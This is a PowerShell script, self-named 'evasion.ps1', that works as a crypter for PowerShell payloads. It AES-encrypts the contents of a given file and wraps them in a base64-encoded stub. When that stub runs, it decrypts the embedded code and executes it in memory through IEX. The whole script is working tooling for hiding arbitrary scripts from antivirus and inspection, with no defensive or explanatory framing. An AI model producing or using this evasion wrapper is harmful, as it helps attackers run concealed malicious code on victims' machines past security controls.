#function Aes {
[CmdletBinding()]
Param( [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Data, #= $args[0],   
		[Switch]
		$Help,
		[Switch]
		$String
    )
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
#	    $aesManaged.IV = [System.Convert]::FromBase64String($IV) to $aesManaged.IV = [Text.Encoding]::UTF8.GetBytes($IV)
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
#	   $aesManaged.Key = [System.Convert]::FromBase64String($key) to $aesManaged.Key = [Text.Encoding]::UTF8.GetBytes($key) 
           $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
if ($Help) {
	Write-Host ".\evasion.ps1 file.txt"
		}
if ($String) {
$key = Create-AesKey
#$key = '10lbKOHL62zy4XBfd7XoFkZR+YId6k5fT8BHR9HTZlw='
$contentEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
$unencryptedString = $contentEncoded
$encryptedString = Encrypt-String $key $unencryptedString
Write-Host $key
Write-Host $encryptedString
}
else {
$key = Create-AesKey
#$key = '10lbKOHL62zy4XBfd7XoFkZR+YId6k5fT8BHR9HTZlw='
$fileContent = get-content -raw $Data
$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
$unencryptedString = $fileContentEncoded 
$encryptedString = Encrypt-String $key $unencryptedString

	$OutputFilePath = '.\Default.ps1'
    $ddata = "ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7DQogICAgJGFlc01hbmFnZWQgPSBOZXctT2JqZWN0ICJTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc01hbmFnZWQiDQogICAgJGFlc01hbmFnZWQuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkMNCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcw0KICAgICRhZXNNYW5hZ2VkLkJsb2NrU2l6ZSA9IDEyOA0KICAgICRhZXNNYW5hZ2VkLktleVNpemUgPSAxMjgNCiAgICBpZiAoJElWKSB7IGlmICgkSVYuZ2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKSB7ICRhZXNNYW5hZ2VkLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSVYpIH0NCiAgICAgICAgZWxzZSB7ICRhZXNNYW5hZ2VkLklWID0gJElWIH0gDQoJfQ0KICAgIGlmICgka2V5KSB7IGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgeyAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpIH0NCiAgICAgICAgZWxzZSB7ICRhZXNNYW5hZ2VkLktleSA9ICRrZXkgfQ0KICAgIH0NCiAgICAkYWVzTWFuYWdlZA0KfQ0KZnVuY3Rpb24gRGVjcnlwdC1TdHJpbmcoJGtleSwgJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikgew0KICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikNCiAgICAkSVYgPSAkYnl0ZXNbMC4uMTVdDQogICAgJGFlc01hbmFnZWQgPSBDcmVhdGUtQWVzTWFuYWdlZE9iamVjdCAka2V5ICRJVg0KICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsNCiAgICAkdW5lbmNyeXB0ZWREYXRhID0gJGRlY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRieXRlcywgMTYsICRieXRlcy5MZW5ndGggLSAxNik7DQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpDQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQ0KfQ0KJGVuY3J5cHRlZFN0cmluZyA9ICdUSEUnOw0KJGtleSA9ICdUSFknOw0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZw0KJFN0YXJ0ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYmFja1RvUGxhaW5UZXh0KSkNCiRTdGFydCB8IElFWA0K"
	$output = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ddata))
    Out-File -InputObject $output -FilePath $OutputFilePath
(Get-Content -raw $OutputFilePath) | Foreach-Object {
$_ -replace 'THE', $encryptedString `
-replace 'THY', $key 
} | Set-Content ($Data + 'aes.ps1')
get-content -raw ($Data + 'aes.ps1')
}

